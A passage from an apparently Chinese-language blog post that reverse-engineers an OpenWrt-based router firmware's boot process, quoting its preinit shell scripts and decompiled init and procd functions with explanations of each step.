&#x27;Default&#x27; ];</span><br><span class="line">then</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">set</span> dftmac from tddp flash</span></span><br><span class="line">/usr/bin/tddpd dftmac</span><br><span class="line">/lib/cfg_save/config.sh save</span><br><span class="line">else</span><br><span class="line">   echo &quot;no&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[ &quot;$INITRAMFS&quot; = &quot;1&quot; ] || boot_hook_add preinit_main do_mount_root</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">failsafe_netlogin () &#123;</span><br><span class="line">telnetd -l /bin/login.sh &lt;&gt; /dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">failsafe_shell() &#123;</span><br><span class="line">lock /tmp/.failsafe</span><br><span class="line">ash --login</span><br><span class="line">echo &quot;Please reboot system when done with failsafe network logins&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add failsafe failsafe_netlogin</span><br><span class="line">boot_hook_add failsafe failsafe_shell</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">run_init() &#123;</span><br><span class="line">preinit_ip_deconfig</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main run_init</span><br></pre></td></tr></table></figure><p>执行preinit_essential，而preinit_essential中啥也没有，因此什么都不执行？？</p><p>之后执行preinit_main，preinit_main中有<strong>define_default_set_state</strong>，<strong>do_ipq806x</strong>，<strong>preinit_ip</strong>，<strong>pi_indicate_preinit</strong>，<strong>failsafe_wait</strong>，<strong>run_failsafe_hook</strong>，<strong>indicate_regular_preinit</strong>，<strong>initramfs_test</strong>，<strong>do_mount_root</strong>，<strong>run_init</strong>函数，分别执行如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">define_default_set_state</span>() &#123;</span><br><span class="line">. /etc/diag.sh</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行&#x2F;etc&#x2F;diag.sh，<code>set_state() &#123; :; &#125;</code>default set</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do_ipq806x() &#123;</span><br><span class="line">. /lib/ipq806x.sh</span><br><span class="line"></span><br><span class="line">ipq806x_board_detect</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行ipq806x.sh脚本中的**<code>ipq806x_board_detect</code>**函数，作用：读取板子的信息并记录</p><p><strong><code>preinit_ip</code></strong> 函数</p><ul><li><strong>接口选择</strong>：<ul><li>如果 <code>pi_ifname</code> 未设置，则使用 <code>ifname</code>。</li></ul></li><li><strong>配置接口</strong>：<ul><li>检查接口是否存在于 <code>/proc/net/dev</code>。</li><li>使用 <code>ifconfig</code> 命令配置接口的 IP 地址、子网掩码和广播地址，并激活接口。</li></ul></li></ul><p>**<code>pi_indicate_preinit</code>**：输出并亮灯预示初始化的状态，想来启动路由器的时候的亮灯由此而来</p><p><strong><code>failsafe_wait</code></strong> 函数：检测系统上是否应该进入故障安全模式（在给定的超时时间内<strong>等待特定按键输入</strong>，以触发故障安全模式或设置调试级别）</p><p>**<code>run_failsafe_hook</code> **函数：检查系统是否进入故障安全模式，如果进入则执行failsafe，并创建一个锁lock -w &#x2F;tmp&#x2F;.failsafe</p><p>**<code>indicate_regular_preinit</code>**函数：输出”Continuing with Regular Preinit\n”，并再次亮灯</p><p>**<code>initramfs_test</code>**函数：检查系统是否在 initramfs 模式下运行，并执行相关操作</p><blockquote><p>Initramfs 模式是一种用于引导 Linux 系统的初始文件系统模式。它通常用于在内核启动时提供一个临时的根文件系统，以便加载必要的驱动程序和初始化脚本，直到真正的根文件系统可以挂载为止。（或许解加密脚本便是从这里开始的？？）</p></blockquote><p>**<code>do_mount_root</code> **函数：负责挂载根文件系统并进行相关初始化。</p><p>**<code>run_init</code>**函数：运行preinit_ip_deconfig，负责卸载特定网络接口的 IP 配置。（对于重置网络环境十分重要）</p><p>至此preinit便运行完成</p><p>之后便回到&#x2F;sbin&#x2F;init中执行uloop_run(v1);</p><h3 id="sub-9344"><a href="#sub-9344" class="headerlink" title="sub_9344"></a>sub_9344</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_9344</span><span class="params">(<span class="type">int</span> result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_DWORD *)(result + <span class="number">16</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或许是对下一个的赋值？？要求下一个函数必须在子进程运行完毕才可运行？（感觉有道理</p><h3 id="sub-9350"><a href="#sub-9350" class="headerlink" title="sub_9350"></a>sub_9350</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_9350</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// r4</span></span><br><span class="line">  FILE *v1; <span class="comment">// r0</span></span><br><span class="line">  FILE *v2; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">stat</span> v4; <span class="comment">// [sp+0h] [bp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">2</span>]; <span class="comment">// [sp+58h] [bp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+60h] [bp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>]; <span class="comment">// [sp+64h] [bp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/sbin/procd&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_9BC4</span>();</span><br><span class="line">  <span class="keyword">if</span> ( dword_12488 &gt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">kill</span>(dword_12488, <span class="number">9</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">stat</span>(<span class="string">&quot;/tmp/sysupgrade&quot;</span>, &amp;v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">sleep</span>(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">unsetenv</span>(<span class="string">&quot;INITRAMFS&quot;</span>);</span><br><span class="line">  <span class="built_in">unsetenv</span>(<span class="string">&quot;PREINIT&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dword_12474 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Exec to real procd now\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Exec to real procd now\n&quot;</span>, <span class="string">&quot;spawn_procd&quot;</span>, <span class="number">66</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;WDTFD&quot;</span>, v0, <span class="number">1</span>);</span><br><span class="line">  v1 = <span class="built_in">fopen</span>(<span class="string">&quot;/tmp/debug_level&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v2 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fscanf</span>(v1, <span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">    <span class="built_in">fclose</span>(v2);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/tmp/debug_level&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v6 - <span class="number">1</span>) &lt;= <span class="number">3</span> )</span><br><span class="line">      dword_12474 = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_12474 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(s, <span class="number">2u</span>, <span class="string">&quot;%d&quot;</span>, dword_12474);</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;DBGLVL&quot;</span>, s, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">execvp</span>(argv[<span class="number">0</span>], argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数用于清理环境、设置调试级别，并最终再次执行 <code>/sbin/procd</code></p><h2 id="sbin-procd-1"><a href="#sbin-procd-1" class="headerlink" title="&#x2F;sbin&#x2F;procd"></a>&#x2F;sbin&#x2F;procd</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">getenv</span>(<span class="string">&quot;DBGLVL&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    debug_level = <span class="built_in">atoi</span>(v5);</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;DBGLVL&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">getopt</span>(argc, (<span class="type">char</span> *<span class="type">const</span> *)argv, <span class="string">&quot;d:s:h:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ......</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="built_in">uloop_init</span>();</span><br><span class="line">  v10 = <span class="built_in">sub_A798</span>(v9);</span><br><span class="line">  <span class="built_in">sub_F594</span>(v10);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">getpid</span>() == <span class="number">1</span> )</span><br><span class="line">    v11 = <span class="built_in">sub_AE4C</span>();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v11 = <span class="built_in">sub_BD60</span>();</span><br><span class="line">  <span class="built_in">uloop_run</span>(v11);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于没有参数，便直接break了</p><h3 id="sub-A798"><a href="#sub-A798" class="headerlink" title="sub_A798"></a>sub_A798</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_A798</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">signal</span>(<span class="number">13</span>, (<span class="type">__sighandler_t</span>)<span class="number">1</span>);</span><br><span class="line">  result = <span class="built_in">getpid</span>();</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">15</span>, &amp;act, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">10</span>, &amp;act, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">12</span>, &amp;act, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">11</span>, &amp;off_1AA20, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">7</span>, &amp;off_1AA20, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">1</span>, &amp;off_1AA34, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">9</span>, &amp;off_1AA34, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sigaction</span>(<span class="number">19</span>, &amp;off_1AA34, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置系统调用的处理方式，act是shutdown，1AA20是reboot，1AA34是无效调用</p><p>由于是execvp替换进程而pid是不会改变的，因此pid还是1，调用sub_AE4C函数</p><h3 id="sub-AE4C"><a href="#sub-AE4C" class="headerlink" title="sub_AE4C"></a>sub_AE4C</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_AE4C</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Change state %d -&gt; %d\n&quot;</span>, choi, choi + <span class="number">1</span>);</span><br><span class="line">    a1 = <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Change state %d -&gt; %d\n&quot;</span>, <span class="string">&quot;procd_state_next&quot;</span>, <span class="number">90</span>, choi, choi + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ++choi;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_AC7C</span>(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sub-AC7C"><a href="#sub-AC7C" class="headerlink" title="sub_AC7C"></a>sub_AC7C</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sub_AC7C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">28</span>]; <span class="comment">// [sp+4h] [bp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;/sbin/ubusd&quot;</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( choi )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- early -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - early -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_AACC</span>(<span class="number">0</span>);</span><br><span class="line">      v0 = <span class="built_in">sub_10C5C</span>(<span class="string">&quot;/etc/hotplug.json&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_FAF8</span>(v0);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">sub_AACC</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- ubus -\n&quot;</span>);</span><br><span class="line">      v1 = <span class="built_in">fputs</span>(<span class="string">&quot;procd: - ubus -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_BD60</span>(v1);</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- init -\n&quot;</span>);</span><br><span class="line">      v2 = <span class="built_in">fputs</span>(<span class="string">&quot;procd: - init -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_D628</span>(v2);</span><br><span class="line">      <span class="built_in">sub_D4CC</span>(<span class="string">&quot;ubus&quot;</span>, v3);</span><br><span class="line">      <span class="built_in">sub_B458</span>();</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;respawn&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;askconsole&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;askfirst&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;sysinit&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- init complete -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - init complete -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- shutdown -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - shutdown -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;shutdown&quot;</span>);</span><br><span class="line">      <span class="built_in">sync</span>();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- reboot -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - reboot -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">reboot</span>(dword_1ACCC);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Unhandled state %d\n&quot;</span>, choi);</span><br><span class="line">      <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: Unhandled state %d\n&quot;</span>, choi);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>状态处理</strong></p><ol><li><strong><code>case 1</code> - Early</strong>：<ul><li>记录日志 “- early -“</li><li>调用 <code>sub_AACC(0)</code> 执行早期初始化。</li><li>调用 <code>sub_10C5C(&quot;/etc/hotplug.json&quot;)</code> 处理配置文件。</li><li>调用 <code>sub_FAF8</code> 可能用于进一步初始化。</li></ul></li><li><strong><code>case 2</code> - Ubus Initialization</strong>：<ul><li>调用 <code>sub_AACC(0)</code>。</li><li>记录日志 “- ubus -“</li><li>调用 <code>sub_BD60</code> 进行 Ubus 初始化。</li><li>记录日志 “- init -“</li><li>调用 <code>sub_D628</code> 进行进一步初始化。</li><li>调用 <code>sub_D4CC(&quot;ubus&quot;, v3)</code> 启动 <code>/sbin/ubusd</code>。</li><li>调用 <code>sub_B458()</code> 执行其他初始化步骤。</li><li>调用 <code>sub_B3F4</code> 处理一系列状态（”respawn”, “askconsole”, “askfirst”, “sysinit”）。</li></ul></li><li><strong><code>case 3</code> - Init Complete</strong>：<ul><li>记录日志 “- init complete -“</li></ul></li><li><strong><code>case 4</code> - Shutdown</strong>：<ul><li>记录日志 “- shutdown -“</li><li>调用 <code>sub_B3F4(&quot;shutdown&quot;)</code> 处理关闭操作。</li><li>调用 <code>sync()</code> 确保数据完整性。</li></ul></li><li><strong><code>case 5</code> - Reboot</strong>：<ul><li>记录日志 “- reboot -“</li><li>调用 <code>reboot(dword_1ACCC)</code> 执行重启。</li></ul></li><li><strong><code>default</code> - Unhandled State</strong>：<ul><li>记录未处理状态的日志。</li></ul></li></ol><h4 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h4><p>sub_AACC函数确保在系统启动时正确初始化看门狗，以便在系统无响应时采取适当措施。</p><p>sub_10C5C函数用于设置和配置一个处理热插拔事件的套接字，并将其集成到事件循环中（或许第一次是初始化，这次才是配置？）</p><h4 id="sub-FAF8"><a href="#sub-FAF8" class="headerlink" title="sub_FAF8"></a>sub_FAF8</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">sub_FAF8</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">void</span> *data; <span class="comment">// [sp+0h] [bp-20h]</span></span><br><span class="line">  <span class="type">char</span> *file[<span class="number">6</span>]; <span class="comment">// [sp+8h] [bp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  file[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  file[<span class="number">0</span>] = <span class="string">&quot;udevtrigger&quot;</span>;</span><br><span class="line">  <span class="built_in">umount2</span>(<span class="string">&quot;/dev/pts&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">umount2</span>(<span class="string">&quot;/dev/&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">mount</span>(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/dev&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0</span>, <span class="string">&quot;mode=0755,size=512K&quot;</span>);</span><br><span class="line">  <span class="built_in">mkdir</span>(<span class="string">&quot;/dev/shm&quot;</span>, <span class="number">0x1ED</span>u);</span><br><span class="line">  <span class="built_in">mkdir</span>(<span class="string">&quot;/dev/pts&quot;</span>, <span class="number">0x1ED</span>u);</span><br><span class="line">  <span class="built_in">mount</span>(<span class="string">&quot;devpts&quot;</span>, <span class="string">&quot;/dev/pts&quot;</span>, <span class="string">&quot;devpts&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  dword_1AE8C = (<span class="type">int</span>)sub_FA40;</span><br><span class="line">  v0 = fork();</span><br><span class="line">  dword_1AE90 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">execvp</span>(file[<span class="number">0</span>], file);</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start coldplug\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;procd: Failed to start coldplug\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start new coldplug instance\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;procd: Failed to start new coldplug instance\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">uloop_process_add</span>(&amp;unk_1AE80);</span><br><span class="line">    <span class="keyword">if</span> ( (<span 